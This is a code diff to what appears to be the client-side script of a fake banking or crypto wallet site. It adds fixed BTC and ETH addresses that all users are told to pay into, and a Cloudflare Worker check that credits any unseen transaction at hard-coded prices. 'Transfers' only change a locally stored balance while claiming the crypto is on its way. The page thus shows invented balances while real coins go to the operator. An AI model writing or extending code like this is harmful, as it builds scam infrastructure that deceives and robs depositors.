@@ -108,11 +108,30 @@ function destHint(method){
 }
 
 function refreshDest(){
-  var hint = destHint($('mMethod').value);
+  var m = $('mMethod').value;
+  var hint = destHint(m);
+  var isAdd = (mode === 'add');
+
   if (hint.show){
     $('mDestWrap').style.display = 'block';
-    $('mDestLabel').textContent = hint.label;
-    $('mDest').placeholder = hint.ph;
+    $('mDest').value = '';
+    $('mDest').readOnly = false;
+
+    if (isAdd && m === 'Bitcoin (BTC)'){
+      $('mDestLabel').textContent = 'Send BTC to this address';
+      $('mDest').value = '19YWxuHf1TbdZzZdV9FSzYfops6M2GLhe7';
+      $('mDest').readOnly = true;
+    } else if (isAdd && m === 'Ethereum (ETH)'){
+      $('mDestLabel').textContent = 'Send ETH to this address';
+      $('mDest').value = '0xFB7A7956Af77061D3B5f3B357ef9c0a22CD60e97';
+      $('mDest').readOnly = true;
+    } else if (isAdd){
+      $('mDestLabel').textContent = 'Your reference (optional)';
+      $('mDest').placeholder = 'Enter reference';
+    } else {
+      $('mDestLabel').textContent = hint.label;
+      $('mDest').placeholder = hint.ph;
+    }
   } else {
     $('mDestWrap').style.display = 'none';
     $('mDest').value = '';
@@ -122,9 +141,12 @@ function refreshDest(){
 function openModal(m){
   mode = m;
   $('mTitle').textContent = m === 'add' ? 'Add Funds' : 'Transfer Funds';
-  $('mDesc').textContent = m === 'add' ? 'Enter the amount you wish to deposit.' : 'Enter the amount and recipient details.';
+  $('mDesc').textContent = m === 'add'
+    ? 'Enter amount, then send crypto to the address below.'
+    : 'Enter amount and recipient details.';
   $('mAmount').value = '';
   $('mDest').value = '';
+
   if (m === 'transfer'){
     $('mMethod').value = 'Bank Transfer (SEPA)';
   } else {
@@ -147,20 +169,28 @@ function confirmModal(){
   if (!a || a <= 0){ toast('Please enter a valid amount', true); return; }
 
   if (mode === 'add'){
+    // === КРИПТО-ДЕПОЗИТ — проверяем блокчейн ===
+    if (m === 'Bitcoin (BTC)' || m === 'Ethereum (ETH)'){
+      toast('Checking blockchain...', false);
+      checkCryptoDeposit(m, a);
+      return;
+    }
+    // === Фиатный депозит ===
     st.usd += a;
-    addTx('Deposit via ' + m, a, isCrypto(m) ? 'Processing' : 'Under Review');
+    addTx('Deposit via ' + m, a, 'Under Review');
     toast('Added ' + fmt(a));
     closeModal();
     render();
     return;
   }
 
+  // === TRANSFER ===
   if (a > st.usd){ toast('Insufficient balance', true); return; }
   if (!dest){ toast('Please enter recipient details', true); return; }
 
   st.usd -= a;
   var desc;
-  if (isCrypto(m)){
+  if (m === 'Bitcoin (BTC)' || m === 'Ethereum (ETH)'){
     desc = 'Crypto transfer to ' + dest.slice(0, 12) + '… via ' + m;
     addTx(desc, -a, 'Processing');
     toast('Crypto sent — arrives in 10-30 min');
@@ -324,3 +354,63 @@ setInterval(function(){
 
 /* ========== INIT ========== */
 render();
+
+
+/* ========== CRYPTO DEPOSIT CHECKER (Cloudflare Worker) ========== */
+var WORKER_URL = 'https://nordic-deposit-checker.otis-790.workers.dev';
+
+function checkCryptoDeposit(method, amount){
+  var url = WORKER_URL + '?action=check';
+  fetch(url)
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (!data || !data.result){
+        toast('Could not check blockchain. Try again.', true);
+        return;
+      }
+      var list = null;
+      var isBtc = (method === 'Bitcoin (BTC)');
+      if (isBtc && data.result.btc) list = data.result.btc;
+      if (!isBtc && data.result.eth) list = data.result.eth;
+      if (!list || list.length === 0){
+        toast('No incoming ' + (isBtc ? 'BTC' : 'ETH') + ' found yet. Wait a minute and try again.', true);
+        return;
+      }
+      var found = null;
+      for (var i = 0; i < list.length; i++){
+        var tx = list[i];
+        var id = tx.hash;
+        var already = false;
+        for (var j = 0; j < st.txs.length; j++){
+          if (st.txs[j].hash === id){ already = true; break; }
+        }
+        if (!already){ found = tx; break; }
+      }
+      if (!found){
+        toast('No new deposits found.', true);
+        return;
+      }
+      var actualAmount = isBtc ? (found.amount * 68000) : (found.value * 3200);
+      var credit = actualAmount > 0 ? actualAmount : amount;
+      st.usd += credit;
+      var newTx = {
+        date: now(),
+        ts: Date.now(),
+        desc: 'Crypto deposit via ' + method + ' (' + found.hash.slice(0, 10) + '…)',
+        amt: credit,
+        status: 'Processing',
+        hash: found.hash
+      };
+      st.txs.unshift(newTx);
+      if (isBtc){ st.btc += found.amount; }
+      else { st.eth += found.value; }
+      save();
+      closeModal();
+      render();
+      toast('Deposit received! Credited ' + fmt(credit));
+    })
+    .catch(function(err){
+      console.error('Worker error:', err);
+      toast('Could not reach blockchain. Try again later.', true);
+    });
+}
